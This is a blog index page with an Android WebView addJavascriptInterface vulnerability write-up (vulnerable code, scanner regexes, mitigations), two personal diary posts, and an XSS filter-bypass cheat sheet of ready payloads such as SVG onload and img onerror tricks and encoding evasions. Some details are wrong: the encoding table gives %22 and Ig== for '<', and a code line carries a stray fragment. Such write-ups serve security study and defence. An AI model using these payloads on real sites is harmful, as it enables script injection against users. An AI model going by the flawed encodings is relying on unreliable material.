<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>idhyt&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="水中月.镜中花.浮华一片苍凉..">
<meta property="og:type" content="website">
<meta property="og:title" content="idhyt's blog">
<meta property="og:url" content="http://blog.idhyt.com/page/5/index.html">
<meta property="og:site_name" content="idhyt's blog">
<meta property="og:description" content="水中月.镜中花.浮华一片苍凉..">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="idhyt's blog">
<meta name="twitter:description" content="水中月.镜中花.浮华一片苍凉..">
  
    <link rel="alternate" href="/atom.xml" title="idhyt&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">idhyt&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">云淡风轻</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜尋"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.idhyt.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-android-abusing-webview" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/04/09/android-abusing-webview/" class="article-date">
  <time datetime="2015-04-09T03:30:21.000Z" itemprop="datePublished">2015-04-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/android/">android</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/04/09/android-abusing-webview/">WebView组件远程代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160; &#160; &#160; &#160;在android的sdk中封装了webView控件,在webView下有一个非常特殊的接口函数addJavascriptInterface,利用这个接口函数可实现穿透webkit控制android 本机。</p>
<h3 id="简介">简介</h3><p>&#160; &#160; &#160; &#160;Webview是Android用于浏览网页的组件，它的接口函数addJavascriptInterface可以实现网页JS与本地JAVA的交互，但是没有限制已注册JAVA类的方法调用，导致可以利用反射机制调用未注册的其它任何JAVA类。当Android用户访问恶意网页时，会被迫执行系统命令，如安装木马、盗取敏感数据等。</p>
<h3 id="漏洞详情">漏洞详情</h3><p>构建一个使用Webview组件的程序</p>
<h4 id="1-_AndroidManifest-xml添加网络访问权限">1. AndroidManifest.xml添加网络访问权限</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">uses-permission</span> <span class="attribute">android:name</span>=<span class="value">"android.permission.INTERNET"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="2-_activity_my-xml添加Webview控件">2. activity_my.xml添加Webview控件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">WebView</span></span><br><span class="line">     <span class="attribute">android:layout_width</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:layout_height</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:id</span>=<span class="value">"@+id/webView"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="title">WebView</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="3-_MainActivity-java添加关键代码">3. MainActivity.java添加关键代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="comment">// add webview func</span></span><br><span class="line">    WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">    webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);<span class="string">");</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="4-_测试页面">4. 测试页面</h4><p>&#160; &#160; &#160; &#160;<a href="http://idhyt.sinaapp.com/vultest/checkwebview.html" target="_blank" rel="external">webview漏洞测试页面</a><br>&#160; &#160; &#160; &#160;<a href="http://idhyt.sinaapp.com/vultest/webviewexp.html" target="_blank" rel="external">webview漏洞利用页面</a><br><br></p>
<h4 id="5-_测试结果">5. 测试结果</h4><p>&#160; &#160; &#160; &#160;在没有使用addJavascriptInterface接口函数的情况下，<br>也会存在远程代码执行漏洞，原因是webview组件默认调用”searchBoxJavaBridge_”对象。<br>&#160; &#160; &#160; &#160;<img src="http://o9xrwsn0z.bkt.clouddn.com/webview-1.png" alt=""></p>
<p>&#160; &#160; &#160; &#160;当使用addJavascriptInterface接口函数时，代码改为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">webview.getSettings().setJavaScriptCanOpenWindowsAutomatically(<span class="keyword">true</span>);</span><br><span class="line">webview.addJavascriptInterface(<span class="keyword">new</span> test(), <span class="string">"test"</span>);</span><br><span class="line">webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&#160; &#160; &#160; &#160;测试结果<br>&#160; &#160; &#160; &#160;<img src="http://o9xrwsn0z.bkt.clouddn.com/webview-2.png" alt=""></p>
<p>&#160; &#160; &#160; &#160;可以看到，即便test类没有具体实现代码，也一样会触发漏洞。<br><br></p>
<h3 id="漏洞检测">漏洞检测</h3><p>&#160; &#160; &#160; &#160;通过编写静态扫描器过滤出可能存在问题的apk，方法是通过apktool将apk文件反编译成smali,之后进行暴力搜索关键字。<br>&#160; &#160; &#160; &#160;<img src="http://o9xrwsn0z.bkt.clouddn.com/webview-3.png" alt=""><br><br><br>其中用到的几个关键的正则:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取类名</span><br><span class="line"><span class="string">r"^\.class.+(Lcom.+);"</span></span><br><span class="line">获取所有method</span><br><span class="line"><span class="string">r"(\.method[\s\S]*?\.end *method)"</span></span><br><span class="line">获取method方法类型</span><br><span class="line"><span class="string">r"^\.method.+ +(\w+) *\("</span></span><br><span class="line">获取method中的.line</span><br><span class="line"><span class="string">r"\.line([\s\S]*?)(?=(\.line))"</span></span><br><span class="line">获取指定的调用函数</span><br><span class="line"><span class="string">r"setJavaScriptEnabled|addJavascriptInterface"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="防范">防范</h3><ul>
<li>使用removeJavascriptInterface(“searchBoxJavaBridge<em>“)移除searchBoxJavaBridge</em>对象<br>1.重构WebView控件(WebViewEx)</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.idhyt.webview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * Created by idhyt on 2015/4/28.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebViewEx</span> <span class="keyword">extends</span> <span class="title">WebView</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WebViewEx</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, attrs);</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt; <span class="number">10</span> &amp;&amp; Build.VERSION.SDK_INT &lt; <span class="number">17</span>) &#123;</span><br><span class="line">            removeJavascriptInterface(<span class="string">"searchBoxJavaBridge_"</span>);</span><br><span class="line">            <span class="comment">// removeJavascriptInterface("accessibility");</span></span><br><span class="line">            <span class="comment">// removeJavascriptInterface("accessibilityTraversal");</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.修改系统解析XML中定义的属性回调方法(layout\activity_main.xml中<webview>)</webview></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">com.example.idhyt.webview.WebViewEx</span></span><br><span class="line">    <span class="attribute">android:layout_width</span>=<span class="value">"wrap_content"</span></span><br><span class="line">    <span class="attribute">android:layout_height</span>=<span class="value">"wrap_content"</span></span><br><span class="line">    <span class="attribute">android:id</span>=<span class="value">"@+id/webView"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>3.调用WebViewEx控件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    WebViewEx webview = (WebViewEx)findViewById(R.id.webView);</span><br><span class="line">    webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// other function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>确保只在访问可信页面数据时才使用addjavascriptInterface。 </li>
<li>在调用Java对象方法前对参数进行检查，避免执行恶意操作。</li>
<li>对于在4.2(API 17+)系统运行的应用，使用JavascriptInterface代替addjavascriptInterface。</li>
<li>限制对于该接口的使用来源，只允许可信来源访问该接口。例如使用WebViewClient中的shouldOverrideUrlLoading()来对加载的URL进行检查。</li>
</ul>
<h3 id="参考">参考</h3><ol>
<li><a href="http://50.56.33.56/blog/?p=314" target="_blank" rel="external">Abusing WebView JavaScript Bridges</a></li>
<li><a href="http://drops.wooyun.org/papers/548" target="_blank" rel="external">WebView中接口隐患与手机挂马利用</a></li>
<li><a href="http://blog.csdn.net/leehong2005/article/details/11808557" target="_blank" rel="external">Android WebView的Js对象注入漏洞解决方案</a></li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2015/04/09/android-abusing-webview/" data-id="civbwoofb006d5p6iuktyv7my" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2015/04/09/android-abusing-webview/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webview/">webview</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-diary-essay-record" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/23/diary-essay-record/" class="article-date">
  <time datetime="2015-03-23T13:46:33.000Z" itemprop="datePublished">2015-03-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/diary/">diary</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/23/diary-essay-record/">无法描述</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li><p>世界上最美的情话是，我喜欢的人，它正好也喜欢我
        
          <p class="article-more-link">
            <a href="/2015/03/23/diary-essay-record/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2015/03/23/diary-essay-record/" data-id="civbwoob4004w5p6ibsrnalbm" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2015/03/23/diary-essay-record/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/无法描述/">无法描述</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-diary-annual-summary-2014" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/01/02/diary-annual-summary-2014/" class="article-date">
  <time datetime="2015-01-01T19:51:11.000Z" itemprop="datePublished">2015-01-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/diary/">diary</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/01/02/diary-annual-summary-2014/">我的2014</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160; &#160; &#160; &#160;12点，看着别人都是带着wife跨年，先不说这wife是不是自己的，可是我连个wifi都没有，网都连不上，完全不给刷存在感的机会，好心塞。跨年这种事吧，两种情况下才能有气氛，一种是情侣，先不说情侣是不是自己的（又来。。），另一种是身边还有一种单身的人一起热闹，第一种是个人问题，好吧，我个人有问题，第二种吧到了这种年纪，都是在晒孩子的，出了校门哪还有这群闲人啊，想想也是醉了。自己呆着打打游戏吧，总觉得有点可惜，出去看看吧，看的是别人在热闹，一个字，冷暖自知（威虎山还不错）。</p>
<hr>

<p>&#160; &#160; &#160; &#160;另起一行竟然打了个\n。。开始记事件，此刻应该来点音乐。。好，开始。从去年总结开始，过年回家在家呆了一个月，该玩的也玩了，该见的朋友也见了，好像该说的话也说了一点，不过没什么用，很多事情不是你努力就可以改变的，何况我也没有努力过。之后回学校，跟小伙伴们去了趟四姑娘山，想在回想起来还很清晰，当时是感冒加上高原反映加上精神有点亢奋是玩嗨了，这个写下来还是有点多，我还是去看看大神最后剪辑的视频回味一番就好了。看的好伤感啊，正如我毕业论文最后写的，光阴荏苒，岁月如歌，感谢走私团伙的每一位小伙伴，是你们让我拥有一个无比美好的研究生生活，你们的幽默诙谐，令我深深的难忘，你们的一颦一笑，都历历在目，能在这样一个环境中度过，是我极大的荣幸，太官方了哈哈，不过想想校园时光真的是无比美好呐。四姑娘山回来就是各种晃悠日子，每天写点论文，出去吃个饭，看个电影，周末还打个球啥的，那时候经常会想，哎呀，这一天一天没感觉啊，毕业了一定会很想念现在的日子吧，要珍惜每一天的生活，但是总是在拥有的时候，只是想着去珍惜，但却不知道如何去珍惜，就这么悄悄的失去了。离毕业就三个月了，好好珍惜，吃过饭上去打一把人机啊！离毕业就两个月了，好好珍惜，吃过饭打匹配啊！撸一把，撸一把写论文！撸一把刚好去吃饭！又被虐了，不开心！不开心了撸一把！离毕业就一个月了，好好珍惜，卧槽，要答辩了，论文写不完了！不撸了，写论文！好吧，撸一把真的写论文了！重复率xx%，毕不了业了！戒撸了！xx要去查重了，一群人围上去跟看小视频一样！现在想想脑子里都是8楼工作室各种回荡的声音，也是满满的回忆。最后大家都顺利毕业了，照了毕业照，吃了散伙饭，我也如愿的去了云南，虽然过程也是一波三折，虽然有点遗憾没能和黑豆女神在云南会和，但最后也是去了，也留下了奇思妙想的回忆，或许这比那些更加特别呢，是吧哈哈。。有机会还是要再去一趟云南，泸沽湖住个十天半个月的，如果有机会的话。</p>
<hr>

<p>&#160; &#160; &#160; &#160;至此，真的是又一次毕业了，青春又一次散场，虽然不能算是青春了，但是希望大家都永远年轻，永远热泪盈眶，永远心怀梦想，虽然我没什么梦想(感觉又再自黑)。之后回家在家呆了一周，去郑州见了朋友，来到了珠海，开始正式入职工作，感觉没有什么可以回忆的东西了，上班，吃饭，下班，睡觉。这种有规律的生活和学校无规律的生活最大的差别是什么，就是你去回忆学校的事情，你能想到很多很多，甚至很多小的细节，毕业从抽屉里扒出三年所有的发票电影票之类的东西，看着很多都能回想起来当时做了什么，跟谁，在哪里。而工作后的事情，回想半年的，好像没什么东西，就是工作，就好比每周去写周报，卧槽，这周我到底做了什么，每天都很忙，但是好像每天也没忙什么。这种感觉很奇妙，就好比心电图，之前你每天都是在上下波动的，你可以看到他在活跃，在生活，你想不到下一刻会有什么事情发生，是惊喜还是惊吓，忽然就平静下来，不在上下波动而变成一条缓慢向前的直线，虽然你看不到尽头，但是你能想到下一刻大概的轮廓，你没有了期待，没有思考的触点，甚至连梦想这种东西都没有去认真想过。</p>
<hr>

<p>&#160; &#160; &#160; &#160;我这种人平时也那么蒙蒙的，也不怎么知道主动联系人，发状态也是不正经的带着一些段子的味道，也只有在这安静的夜晚，静下心来才会想一些东西，不是不愿静，只是不想静，这种年纪不适合太伤感。就像毕业走的时候，本来就一个人送我，最后竟然辣么多人，我当时其实挺伤感的，因为我知道，一转身，一张张脸以后可能就再也见不到了，当时是多想拥抱一下，可惜下不去那手。最后我发现你们走的时候头都没回，我还想着你们一步三回头的看我几眼，你们竟然慌慌张张的赶着时间去吃自助餐！火车上收到你们的短信，真的是很不舍，要是不用工作该多好。</p>
<hr>

<p>&#160; &#160; &#160; &#160;写着写着还真是思绪乱飞有点伤感了，就此打住。今年就算过去了，刚毕业半年，去年一起来实习的小伙伴走了好几个，有的创业，有的跳槽，还有的纯粹是因为在公司得不到自己想要的而辞职，我只能羡慕他们，有梦想有心志，年轻有机会失败。我总会跟别人说工作可以就别读研浪费三年时间，其实对我来说帮助还是挺大的，因为我大学读的太渣了导致毕业找工作都是问题，有时想想如果没读研或许现在我都成家了吧，孩子可能都有了吧，不过可能混的比现在更差。人生没有重来，总会想着如果再来一次我会怎样怎样，其实如果再来一次，大部分人估计还是这样子吧。朋友说我淡薄，我觉得有点太高看我了，我不是淡薄，我只是能把我得不到的东西看淡，能为自己活的轻松找的借口而已，周围诱惑太多，真的能做到不被功名利禄诱惑的，我从内心相信这样的人是不存在的，而且在这之前，你得有被诱惑的资本，很明显，我没有。</p>
<hr>

<p>&#160; &#160; &#160; &#160;不知道如何结尾，就破天荒的给自己定个目标吧，算是给慢慢变老的心态打打鸡血，2015年，在技术上边某一方面要有突破，年中，知道自己想要什么，年底，确定何去何从。每年写年终总结写到最后的时候都在想，真快啊，明年这个时候会在哪里，身边会不会有个女朋友，然后每年都这么想下去了，按照此规律今年应该想着明年这个时候肯定没有女朋友。。又来。。。。真亦假假亦真，那就当她是个段子吧。</p>
<p>&#160; &#160; &#160; &#160;See you next year! </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2015/01/02/diary-annual-summary-2014/" data-id="civbwooc100525p6i1em05n8l" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2015/01/02/diary-annual-summary-2014/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/无法描述/">无法描述</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-technic-xss-bypass" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/10/15/technic-xss-bypass/" class="article-date">
  <time datetime="2014-10-15T03:56:24.000Z" itemprop="datePublished">2014-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/technic/">technic</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/10/15/technic-xss-bypass/">xss bypass</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>xss绕过技巧整理</p>
<h3 id="几种弹窗绕过">几种弹窗绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>) = <span class="built_in">Function</span>(alert(<span class="number">1</span>))()</span><br><span class="line">= <span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()</span><br><span class="line"><span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>对应alert(<span class="number">1</span>) ascii码的<span class="number">10</span>进制形式（Text2Dec）</span><br><span class="line"><span class="comment">//小写function</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line">alert(<span class="number">1</span>) confirm(<span class="number">1</span>)  prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVG/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">BODY</span> <span class="attribute">onload</span>=<span class="value">"alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">alert(1)</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="title">scirpt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"javascript:prompt(1)"</span> <span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">name</span>=<span class="value">"action"</span> <span class="attribute">value</span>=<span class="value">"b"</span>&gt;</span><span class="tag">&lt;/<span class="title">form</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onload='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span>   ==》<span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">""</span><span class="value">xxx"</span>/<span class="attribute">onload</span>=<span class="value">'prompt(21)'</span><span class="value">"&gt;&lt;/p&gt;</span></span></span></span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤= 括号等 使用xml编码</span></span><br><span class="line">&lt;svg&gt; <span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  </span><br><span class="line">//在SVG向量里面的<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以不封的有:</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">img</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span><span class="tag">&lt;<span class="title">input</span>&gt;</span><span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">p</span>&gt;</span><span class="tag">&lt;<span class="title">SVG</span>&gt;</span></span><br><span class="line">其他标签不封闭会造成页面显示错误等问题。</span></span><br></pre></td></tr></table></figure>
<h3 id="xss中最经常用到的编码">xss中最经常用到的编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">html实体编码(<span class="number">10</span>进制与<span class="number">16</span>进制):</span><br><span class="line">如把尖括号编码[ <span class="xml"><span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> html十进制: &amp;#60;  html十六进制:&amp;#x3c;</span><br><span class="line">javascript的八进制跟十六进制:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> js八进制:\74  js十六进制:\x3c</span><br><span class="line">jsunicode编码：</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span>jsunicode:\u003c</span><br><span class="line">url编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> url: %22</span><br><span class="line">base64编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> base64: Ig==</span></span><br></pre></td></tr></table></figure>
